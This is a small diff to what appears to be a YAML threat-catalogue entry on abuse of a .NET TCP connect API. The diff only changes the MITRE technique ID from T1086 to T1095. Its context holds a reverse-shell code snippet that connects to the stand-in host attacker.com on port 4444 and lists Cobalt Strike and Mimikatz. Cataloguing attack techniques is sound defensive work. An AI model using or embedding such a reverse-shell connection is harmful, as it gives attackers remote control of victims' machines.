@@ -10,7 +10,7 @@ api:
   method: Connect
 abuse_scenarios:
 - name: Reverse shell establishment
-  technique_id: T1086
+  technique_id: T1095
   description: Establish raw TCP connection for reverse shell
   code_snippet: var tcp = new TcpClient("attacker.com", 4444); var stream = tcp.GetStream();
     /* execute commands over stream */
@@ -31,7 +31,7 @@ risk:
   likelihood_in_real_attacks: 70
 references:
   techniques:
-  - T1086
+  - T1095
   tools:
   - Cobalt Strike
   - Mimikatz
